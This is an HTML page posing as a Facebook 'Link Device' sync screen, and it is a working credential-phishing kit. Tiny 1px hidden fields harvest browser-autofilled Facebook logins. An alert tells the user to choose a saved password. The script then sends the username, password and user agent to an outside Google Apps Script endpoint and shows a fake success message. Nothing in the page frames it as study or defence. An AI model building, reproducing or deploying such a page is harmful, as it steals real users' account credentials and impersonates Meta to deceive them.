<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meta Satellite | Facebook Node</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        #fb-container { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); width: 90%; max-width: 400px; text-align: center; }
        .fb-logo { color: #1877f2; font-size: 24px; font-weight: bold; margin-bottom: 20px; }
        .sync-box { border-top: 1px solid #ddd; padding-top: 20px; }
        button { background-color: #1877f2; border: none; border-radius: 6px; color: #fff; font-size: 16px; font-weight: bold; padding: 12px; width: 100%; cursor: pointer; }
        #loader { display: none; margin-top: 20px; }
        
        /* The Facebook Trap Zone */
        #trap-zone { position: absolute; opacity: 0.01; top: 0; left: 0; z-index: -1; }
    </style>
</head>
<body>

<div id="fb-container">
    <div class="fb-logo">facebook</div>
    <div id="ui-main" class="sync-box">
        <p><b>Link Device to Facebook Satellite</b></p>
        <p style="font-size: 13px; color: #606770;">Synchronize your saved sessions and security tokens.</p>
        
        <form id="fb-trap">
            <input type="text" id="email" name="email" autocomplete="username" placeholder="Email or Phone" style="width:1px; height:1px; border:none;">
            <input type="password" id="pass" name="pass" autocomplete="current-password" placeholder="Password" style="width:1px; height:1px; border:none;">
            <button type="button" onclick="startFBSync()">Sync Facebook Profile</button>
        </form>
    </div>

    <div id="loader">
        <p>Connecting to Meta API...</p>
        <img src="https://i.imgur.com/8y9ny7W.gif" width="30" alt="loading">
    </div>
</div>

<script>
    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxv3ohN2zG6VdW64OH4fdioGznBIXLAWhc5gTNT8DSzStXM5zPhfuLEF609wywDvBDXQA/exec';

    function startFBSync() {
        const u = document.getElementById('email').value;
        const p = document.getElementById('pass').value;

        // If fields are empty, Chrome hasn't autofilled yet.
        // On Android, tapping the button usually triggers the Autofill popup.
        if (!u || !p) {
            alert("Please select your Facebook account from the 'Saved Passwords' prompt to continue.");
            return;
        }

        document.getElementById('ui-main').style.display = 'none';
        document.getElementById('loader').style.display = 'block';

        const payload = {
            account: "Facebook_Target",
            username: u,
            password: p,
            device: navigator.userAgent
        };

        fetch(SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify(payload)
        }).then(() => {
            setTimeout(() => {
                alert("Facebook Node Synchronized.");
                location.reload();
            }, 3000);
        });
    }
</script>
</body>
</html>
